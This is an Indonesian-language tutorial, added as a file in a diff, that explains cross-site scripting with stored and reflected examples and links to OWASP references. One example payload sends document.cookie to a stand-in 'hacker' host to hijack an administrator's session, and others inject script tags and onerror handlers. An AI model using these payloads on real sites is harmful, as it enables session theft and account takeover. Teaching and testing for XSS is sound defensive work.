@@ -1,0 +1,63 @@
+XSS (Cross-Site Scripting)
+
+Apa itu XSS ?
+Cross-site Scripting (XSS) adalah serangan code injection yang memungkinkan attacker mengeksekusi JavaScript ke dalam user browser lainnya.
+
+Attacker tidak langsung menyerang targetnya. Melainkan, Dia melakukan exploitasi tentang kerentanan dari website yang dikunjungi oleh korbannya, agar website dapat melanjutkan JavaScript ke korban. Untuk browser korban, JavaScript yang berbahaya akan terlihat seperti bagian dari website.
+
+Bagaimana JavaScript berbahaya dapat dikirim ?
+Satu-satunya cara agar ataccker dapat menjalankan JavaScript buatannya di dalam browser korban adalah dengan menginjeksikannya ke salah satu halaman dimana korban sering melakukan download dari website tersebut. Ini bisa terjadi jika website tersebut mengandung unsur input dari user, karena attacker dapat menyisipkan string yang akan dikira sebagai code dari browser korban.
+
+Contoh :
+print "<html>"
+print "Latest comment:"
+print database.latestComment
+print "<html>"
+
+Script akan mengasumsikan comentar hanya berisikan text saja. Tetapi, karena user input akan dimasukan secara langsung, attacker dapat memasukan komentar berupa "script>...</script>". Semua user saat mengunjungi halaman akan mendapatkan respon berikut :
+
+<html>
+Latest comment:
+<script>...</script>
+</html>
+
+Ketika halaman browser dari user telah selesai load halaman, maka akan mengeksekusi semua code JavaScript yang yang berada di dalam tag <script>. 
+
+Ada juga yang menggunakan elemen onerror pada tags yang ada didalam tag-tag html contohnya :
+
+<html>
+latest comment:
+<img src="gmbr.jpg" onerror="javascript:alert()">
+</html>
+
+-----------------------------------------------------------------------
+XSS Examples
+
+Example 1.
+Untuk contoh, kita mempunyai code HTML snippet:
+<title>Example document: %(title)</title>
+saat kita memasukan maka akan dihasilkan value dari code html diatas dengan browser:
+<title>Example document: XSS Doc</title>
+Situs yang mempunyai search field tidak mempunyai input yang di flter. Dengan membuat query pencarian untuk mencari sesuatu:
+"><SCRIPT>var+img=new+Image();img.src="http://hacker/"%20+%20document.cookie;</SCRIPT>
+saat administrator mengklik link yang kita punya, maka kita dapat mendapatkan cookies session dari administrator tersebut.
+
+Example 2.
+Misalkan ada url di Google sebagai berikut: http://www.google.com/search?q=flowers, yang akan mengembalikan Document HTML dengan fragment <p>Your search for 'flowers' returned the following results:</p>
+i.e., nilai dari parameter query q saat dimasukan kedalam halaman akan dikembalikan oleh Google. Dimana data tersebut tidak di validasi, filter, ataupun terhapus.
+Evil.org dapat menaruh script yang dimana isinya akan dimasukan ke dalam browser yang tak terlihat (iframe) contoh :
+http://www.google.com/search?q=flowers+%3Cscript%3Eevil_script()%3C/script%3E
+
+Ketika korban membuka halaman dari www.evil.org, browser akan membuka iframe dari URL diatas. Document yang dibuka ke dalam iframe akan mempunyai framgent
+<p>Your search for 'flowers <script>evil_script()</script>'
+returned the following results:</p>
+Membuka halaman ini akan menyebabkan browser untuk menjalankan fungsi dari evil_script(). Lalu script ini akan dieksekusi didalam konteks dari page www.google.com
+
+Referensi :
+https://xss-game.appspot.com/
+https://excess-xss.com/
+https://www.veracode.com/security/xss
+https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
+https://www.owasp.org/index.php/Testing_for_Cross_site_scripting
+
+Coba cari referensi lainnya
